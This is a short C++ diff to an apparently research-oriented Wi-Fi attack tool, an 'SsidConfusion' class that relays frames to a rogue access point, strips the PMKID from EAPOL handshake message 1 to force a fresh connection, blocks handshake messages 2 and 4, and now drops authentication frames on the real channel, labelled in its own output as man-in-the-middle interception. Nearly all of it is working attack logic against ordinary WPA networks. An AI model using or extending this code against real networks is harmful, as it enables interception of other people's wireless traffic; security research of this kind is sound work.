@@ -49,7 +49,6 @@ void SsidConfusion::send_to_rogue(PDU &pdu) const {
 
 void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
 	const auto translated = ensure_radiotap(raw);
-	//translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
 	sock_rogue->send(translated, netconfig.rogue_channel);
 }
 
@@ -63,7 +62,7 @@ FrameProcess SsidConfusion::handle_eapol_real(
 		if(msg == 2 || msg == 4) return STOP; //block cycles
 		if(msg == 1) {
 			frame_raw_t stripped = raw;
-			strip_pmkid_kde(stripped); //TODO add to mc_mitm as well (force delete PKMSA)
+			strip_pmkid_kde(stripped); //don't allow PMKSA - only in new connection
 			display_traffic(pdu, "Real channel", " [EAPOL 1/4, PMKID stripped] -- MitM'ing");
 			send_to_rogue(stripped);
 			return STOP;
@@ -110,7 +109,11 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
-	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
+	if(const auto *auth = dot11->find_pdu<Dot11Authentication>()) {
+		display_traffic(*dot11, "Real channel", "-- Ignore");
+		return;
+	}
+	//SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
 
 	#undef SOLVE_OR_CONTINUE
 
